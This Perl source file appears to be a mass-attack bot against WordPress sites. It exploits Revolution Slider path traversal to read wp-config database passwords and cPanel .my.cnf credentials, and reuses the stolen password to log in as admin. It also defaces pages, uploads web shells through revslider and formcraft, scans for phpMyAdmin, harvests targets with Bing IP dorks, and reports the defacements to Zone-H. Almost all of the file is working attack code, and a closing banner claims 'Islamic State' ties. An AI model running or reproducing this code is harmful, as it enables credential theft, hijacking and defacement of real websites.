$resp = $ua->request(HTTP::Request->new(GET => $conflink ));
$conttt = $resp->content;
if($conttt =~ m/DB_NAME/g){
print "...................>: ";
print "[+] Vuln";
print "\n";
print color('reset');
    open(save, '>>Result/vulntargets.txt');   
    print save "rev cnfg $site\n";   
    close(save);
$resp = $ua->request(HTTP::Request->new(GET => $conflink ));
$cont = $resp->content;
while($cont =~ m/DB_NAME/g){


        if ($cont =~ /DB_NAME\', \'(.*)\'\)/){
        print "\t Database Name = $1 \n";
        open (TEXT, '>>Result/databases.txt');
        print TEXT "\n DATABASE  \n$site\n Database Name = $1";
        close (TEXT);
        }
        if ($cont =~ /DB_USER\', \'(.*)\'\)/){
        print "\t Database User = $1 \n";
        open (TEXT, '>>Result/databases.txt');
        print TEXT "\n Database User = $1";
        close (TEXT)
        }
        if ($cont =~ /DB_PASSWORD\', \'(.*)\'\)/){
        print "\t Database Password = $1 \n";
        $pass= $1 ;
        open (TEXT, '>>Result/databases.txt');
        print TEXT "\n Database Password = $pass";
        close (TEXT)
        }
        if ($cont =~ /DB_HOST\', \'(.*)\'\)/){
        print "\t Database Host = $1 \n\n";
        open (TEXT, '>>Result/databases.txt');
        print TEXT "\n Database Host = $1";
        close (TEXT)
        }

wpbrute();
getcpconfig();
}}else{
   print "...................>: ";
print "[-]  [-]  NOT Vuln";
print "\n"; 
getcpconfig();

}

}

####################################################################################################
####################################################################################################




sub getcpconfig{
print"[Revslider Cpanel] ................... ";

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (10);
$cpup = "wp-admin/admin-ajax.php?action=revslider_show_image&img=../../.my.cnf";
$cpuplink = "$site/$cpup";
$resp = $ua->request(HTTP::Request->new(GET => $cpuplink ));
$cont = $resp->content;
if($cont =~ m/user=/g && $cont =~ m/password=/g){
    print color('bold green');
print "[Success]\n";
    print color('reset');

    print save "[rev cpnl] $site\n";   
    close(save);
$resp = $ua->request(HTTP::Request->new(GET => $cpuplink ));
$contt = $resp->content;
while($contt =~ m/user/g){
        if ($contt =~ /user=(.*)/){

        print "\n\t[-]Cpanel User = $1 \n";
print color 'reset';
        open (TEXT, '>>BOTrslt/cp.txt');
        print TEXT "\n[ cpanel ] \n$site\n[-]cpanel user = $1";
        close (TEXT);
        }
        if ($contt =~ /password="(.*)"/){
        print "\t[-]Cpanel Pass = $1 \n\n";
print color 'reset';
        open (TEXT, '>>BOTrslt/cp.txt');
        print TEXT "\n[-]Cpanel Pass = $1";
        close (TEXT)
        }


}
}else{    print color('bold red');
print  "[[-]  NOT Vuln]\n";
    print color('reset');

}


}




##################DEFACE AJAX##############################

sub revdef(){
print "DEFACE AJAX:";

$ajx = $site . 'wp-admin/admin-ajax.php';

$def = $site .'wp-admin/admin-ajax.php?action=revslider_ajax_action&client_action=get_captions_css';

$gassface = POST $ajx, ['action' => 'revslider_ajax_action', 'client_action' => 'update_captions_css', 'data' =>"<body style='color: transparent;background-color: black'><center><h1><b style='color: white'><center><b>Hacked By XBRANG </b><br>XBRANG WOLF <p style='color: transparent'>"];
$response = $ua->request($gassface);
$stat = $response->content;
 if ($stat =~ /true/){
print  "...................>: ";
print "SUCCESS";
print "\n";


my $checkajx= $ua->get("$def")->content;
if($checkajx =~/Hacked|wolf|xbrang/) {

        open(save, '>>Result/vulntargets.txt');   
    print save "rev deface $site\n";   
    close(save);

print "DEFACE ...................>: ";
print "SUCCESS";
print "\n";

print "LINK INDEX ...................>: ";
print "SAVED";
print "\n";

zoneh();
mirrorzon();
}
}else{
    print "...................>: \n";
print "ERROR";
print "\n";

}
}
##########PHP MY ADMIN SCANNER##########

sub zebbik{
print "PMA SCANNER:";
print "...................>: ";
print "WAIT";
print "\n";
use HTTP::Request;
use LWP::UserAgent;
@pat=('/phpMyAdmin/','/phpmyadmin/',
    '/PMA/',
    '/pma/',
    '/admin/',
    '/dbadmin/',
    '/mysql/',
    '/myadmin/',
    '/phpmyadmin2/',
    '/phpMyAdmin2/',
    '/p/m/a/',
    '/PMA2005/',
    '/pma2005/',
    '/phpmanager/',
    '/php-myadmin/',
    '/phpmy-admin/',
    '/webadmin/',
    '/sqlweb/',
    '/websql/',
    '/webdb/',
    '/mysqladmin/',
    '/mysql-admin/');
foreach $pma(@pat){
chomp $pma;

$url = $site.$pma;
$req = HTTP::Request->new(GET=>$url);
$userAgent = LWP::UserAgent->new();
$response = $userAgent->request($req);
$ar = $response->content;
if ($ar =~ m/Welcome to phpMyAdmin|Username|Password/g){
print "$pma ...................>: ";
print "FOUNDED";
print "\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\n PhpMyAdmin $url   =>   PMA Founded !!\n\n";
close (TEXT);

}else{

print "$pma ...................>: ";
print "NOT FOUNDED";
print "\n";

}}
print "PMA SCAN ...................>: ";
print "DONE";
print "\n";
}
#######################################################
sub zebbi{
print "PMA SCANNER:";
print "...................>: ";
print "WAIT";
print "\n";
use HTTP::Request;
use LWP::UserAgent;
@pat=('/phpMyAdmin/','/phpmyadmin/',
    '/PMA/',
    '/pma/',
    '/admin/',
    '/dbadmin/',
    '/mysql/',
    '/myadmin/',
    '/phpMyAdmin-2/',
    '/php-my-admin/',
    '/sqlmanager/',
    '/mysqlmanager/',
    '/p/m/a/',
    '/PMA2005/',
    '/pma2005/',
    '/phpmanager/',
    '/php-myadmin/',
    '/phpmy-admin/',
    '/webadmin/',
    '/sqlweb/',
    '/websql/',
    '/webdb/',
    '/mysqladmin/',
    '/mysql-admin/');
foreach $pma(@pat){
chomp $pma;

$url = $site.$pma;
$req = HTTP::Request->new(GET=>$url);
$userAgent = LWP::UserAgent->new();
$response = $userAgent->request($req);
$ar = $response->content;
if ($ar =~ m/Welcome to phpMyAdmin|Username|Password/g){
print "$pma ...................>: ";
print "FOUNDED";
print "\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\n PhpMyAdmin $url   =>   PMA Founded !!\n\n";
close (TEXT);

}else{

print "$pma ...................>: ";
print "NOT FOUNDED";
print "\n";

}}
print "PMA SCAN ...................>: ";
print "DONE";
print "\n";
revdef();
}
#############WORDPRESS BRUTE####################

sub wpbrute{
print "BRUTE WITH CONFIG PASS:";
$red = $site . '/wp-admin/';
$wp= $site . 'wp-login.php';
$admin = "admin";
print "...................>: ";
print "WAIT";
print "\n";

print "INFO USER : $admin\n INFO PASSWORD : $pass\n";
$brute = POST $wp, [log => $admin, pwd => $pass, wp-submit => 'Log In', redirect_to => $red];
$response = $ua->request($brute);
$stat = $response->status_line;
        if ($stat =~ /302/){
print "BRUTE ...................>: ";
print "LOGIN Uploaded";
print "\n";
        open (TEXT, '>>Result/brute.txt');
        print TEXT "\n BRUTE BOOM $site/wp-login.php => User :$admin Password:$pass\n";
        close (TEXT);
        }else{
            print "BRUTE:...................>:";
print "USER AND PASSWORD DONT MATCH";
print "\n";

}
zebbi();
}
#############################################
sub wpbrutek{
print "BRUTE WITH CONFIG PASS";
$red = $site . '/wp-admin/';
$wp= $site . 'wp-login.php';
$admin = "admin";
print "...................>: ";
print "WAIT";
print "\n";

print "INFO USER : $admin\n[INFO] PASSWORD : $pass\n";
$brute = POST $wp, [log => $admin, pwd => $pass, wp-submit => 'Log In', redirect_to => $red];
$response = $ua->request($brute);
$stat = $response->status_line;
        if ($stat =~ /302/){
print "BRUTE ...................>: ";           
print "LOGIN SUCCESS";
print "\n";
        open (TEXT, '>>Result/brute.txt');
        print TEXT "\n BRUTE BOOM $site/wp-login.php => User :$admin Password:$pass\n";
        close (TEXT);
        }else{
            print " BRUTE ...................>:";
print "USER AND PASSWORD DONT MATCH";
print "\n";

}
zebbik();
}

##################################     REVSLIDER SHELL     #########################################

sub revshell(){
print "REVSLIDER SHELL:";
if($site !~ /http:\/\//) { $site = "http://$site/"; };
my $zip = "revslider.zip";
my $action;
my $update_file;
$action = "revslider_ajax_action";
$update_file = "$zip";
my $targd = "wp-admin/admin-ajax.php";
my $herwgo = "$site/wp-content/plugins/revslider/temp/update_extract/revslider/herewgo.php";

my $herwgo = $ua->get("$site/wp-content/plugins/revslider/temp/update_extract/revslider/xbrangwolf.php")->content;




sub randomagent {
my @array = ('Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0',
'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31'
);
my $random = $array[rand @array];
return($random);
}
my $useragent = randomagent();

my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent($useragent);
my $exploit = $ua->post("$site/$targd", Cookie => "", Content_Type => "form-data", Content => [action => "$action", client_action => "update_plugin", update_file => ["$update_file"]]);
if ($exploit->decoded_content =~ /Wrong update extracted folder/) {
print "...................>: ";
print "[+] Vuln";
print "\n";
print "UPLOAD SHELL";
my $exploitrevshell = $ua->get("$herwgo")->content;
my $exploitrevshellz = $ua->get("$site/xbrang.php")->content;
if($exploitrevshellz =~/<form method=post>Password: <input type=password name=pass><input type=submit value=/) {
    print "...................>: ";
print "OK";
print "\n";
print "SHELL LINK => $site/xbrang.php\n";
    open(save, '>>Result/shells.txt');  
    print save "REVSLIDER $site/xbrang.php\n";  
    close(save);
my $checkun = $ua->get("$site/wolf3.php")->content;
if($checkun =~ /path:(.*)<b><br>uname:(.*)<br><\/b>Marocanwolfteam/){
    print "\n";
print "Path : $1","\n\n";

print "Kernel:$2","\n";
    open(save, '>>Result/shells.txt');  
    print save "Path : $1\nKernel:$2\n";
    close(save);
$def="$site/xbrang.html";
print "INDEX LINK => $def \n";

zoneh();
mirrorzon();
}
}else{
print "...................>: ";
print "ERROR";
print "\n";
getconfig();
}
}
else {
print "...................>: ";
print "[-]  [-]  NOT Vuln";
print "\n";

getconfig();
}
}

sub XBRANG(){
my $url = "$site//wp-content/plugins/add-list-css/";
my $url = "$site/wp-content/plugins/formcraft/file-upload/server/php/";



my $shell ="xbrangwolf.php";
my $field_name = "files[]";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$formcraftup="$site/wp-content/plugins/formcraft/file-upload/server/php/files/xman.php";
$formcraftup="$site//wp-content/plugins/add-list-css/xman.php";

if ($response->content =~ /{"files/) {

print color('Red'), "(*) - Fuck ...>:$site\n";

print color('bold yellow'), "[+] VULN\n";

print "(+)Shell Uploaded\n";
 print color('bold white'),"[+]  [Dir] => $formcraftup\n";
print "\n";
 open (TEXT, '>>Result/wp-shellz.txt');
        print TEXT " wp-conct SHELL => $formcraftup\n";
        close (TEXT);
}else{
print color('bold yellow'), "...................>: ";
print "[-]  [-]  NOT Vuln";
print "\n";
}

    }
######################################    zone h poster      #######################################

sub zoneh(){
# Zone-h Marocan wolf thanks 
print "ZONE-H By Xbrang :";
    open(save, '>>Result/index.txt');   
    print save "$def\n";   
    close(save);
                                
                                $hack="X~brang"; # chaneg X~brang bY Your zone h name :p - thats not recode lamerz lol ..//
                                $zn="http:///notify/single";
                                $lwp=LWP::UserAgent->new;
                                $res=$lwp  -> post($zn,[
                                'defacer'     => $hack,
                                'domain1'   => $def,
                                'hackmode' => '15',
                                'reason'       => '1',
                                'submit'       => 'Send',
                                ]);
                                if ($res->content =~ />ERROR<\/font><\/li>/) {
                                print ":...................>: ";
print "ERROR :( ";
print "\n";

                                }
                                elsif ($res->content =~ />OK<\/font><\/li>/) {
                                print ":...................>: ";
print "OK";
print "\n";

                                }
                                else
                                {
                                print " {-} ERROR :( ! Error Can't Submit it On Zone-h wolf xbrang","\n";

                                }
                            }

##################################### WOLF ZONE-H     #######################################

sub mirrorzon(){
    #  for mirror zone post xD 
    print "MIRROR-ZONE:";
$mz = "http://mirror-zone.org/notify/singel.php";
$fgtn="Wolf marocan"; # u can change it by ur name on mirror zone and plz madafaking bitchs dont call this recode lol !
$mzp = POST $mz, hacker => $fgtn, text => $def;
$response = $ua->request($mzp);
if ($response->content =~ /Deface Add successfully added to Archive .../) {
print "...................>: ";
print "(+)OK";
print "\n";
}else {
print "...................>: ";
print "(-)ERROR";
print "\n";
}
}
sub adminchk($site){
print "Admin:...................>: ";
$k = $site . '/admin/';
my $checkadm= $ua->get("$k")->content;
if($checkadm =~/type=\"password\"/) {
        open(save, '>>Result/admin.txt');   
    print save "$site/admin\n";   
    close(save);
print "OK";
print " \n\n";
}else {
print "ERROR";
print " \n\n";
}
}
sub opchk($site){
print "OPENCART:...................>: ";
$k = $site . '/admin/';
my $checkadm= $ua->get("$k")->content;
if($checkadm =~/common\/forgotten/) {
open(save, '>>Result/opencart.txt');   
 print save "$site\n";   
  close(save);
print "OK";
print "\n\n";
}else {
print "ERROR";
print "\n\n";
}
}

if($targett eq 'ip')
{
}
##############################
sub gett(){
$ip= (gethostbyname($tofuck))[4];
my ($a,$b,$c,$d) = unpack('C4',$ip);
for ($i = 1; $i <= 255; $i+=1){
$ips ="$a.$b.$c.$i";
OUTER: foreach $ip($ips){
print color('bold green')," IP:--> $ips\n";
        print TEXT "$ips\n";
        close (TEXT);
$dork="ip:$ips";
gassone();
}
}
}
#############################
sub get(){

$ip= (gethostbyname($tofuck))[4];
my ($a,$b,$c,$d) = unpack('C4',$ip);
$ips="$a.$b.$c.$d";
print color('bold green')," IP : $ips\n";
        print TEXT "$ips\n";
        close (TEXT);
$dork="ip:$ips";
gassone();
}
####################################"
sub gassone(){
for ($ii = 1; $ii <= 2000; $ii+=10){

$url = "http://www.bing.com/search?q=$dork&filt=all&first=$ii&FORM=PERE";
$resp = $ag->request(HTTP::Request->new(GET => $url));
$rrs = $resp->content;

while($rrs =~ m/<a href=\"?http:\/\/(.*?)\//g){



$link = $1;
	if ( $link !~ /overture|msn|live|bing|yahoo|duckduckgo|google|yahoo|microsof/)
	{
				if ($link !~ /^http:/)
			 {
				$link = 'http://' . "$link" . '/';
			 }



if($link !~ /\"|\?|\=|index\.php/){
					if  (!  grep (/$link/,@result))
					{
print "$link\n";
open(save, '>>sites.txt');
    print save "$link\n";
    close(save);
						push(@result,$link);
					}
} 
}
}
####
if ($rrs !~ m/class=\"sb_pagN\"/g){
next OUTER;
}
}
}
###########
sub gassonee(){
for ($ii = 1; $ii <= 2000; $ii+=10){

$url = "http://www.bing.com/search?q=$dork&filt=all&first=$ii&FORM=PERE";
$resp = $ag->request(HTTP::Request->new(GET => $url));
$rrs = $resp->content;

while($rrs =~ m/<a href=\"?http:\/\/(.*?)\//g){



$link = $1;
	if ( $link !~ /overture|msn|live|bing|yahoo|duckduckgo|google|yahoo|microsof/)
	{
				if ($link !~ /^http:/)
			 {
				$link = 'http://' . "$link" . '/';
			 }



if($link !~ /\"|\?|\=|index\.php/){
					if  (!  grep (/$link/,@result))
					{
print "$link\n";
open(save, '>>sites.txt');
    print save "$link\n";
    close(save);
						push(@result,$link);
					}
} 
}
}
####
if ($rrs !~ m/class=\"sb_pagN\"/g){
exit;
}
}
}

                           +########################## +
                           #   WOLF XBRANG BOT v3.7.7    #                 
                           #                           #
###############################################################################################+
 print color("bold white"), "\n\n\Moroccanwolf - Islamic State \n";-                            # 
                                                                                                #   
	print color("bold yellow"),"THIS HACKING DOES NOT HELP ANYONE, ANIMAL OR ANYWHERE \n";      #
	                                                                                            #
	   print color("bold white"), "Hacked By Mr.xbrang\n";                                      #
	                                                                                            #
	     print color("bold Green"), "My friend: |BAJATAX|Zarox~Ztayli|Marocan wolf|\n";               #
                                                                                                #
################################################################################################+
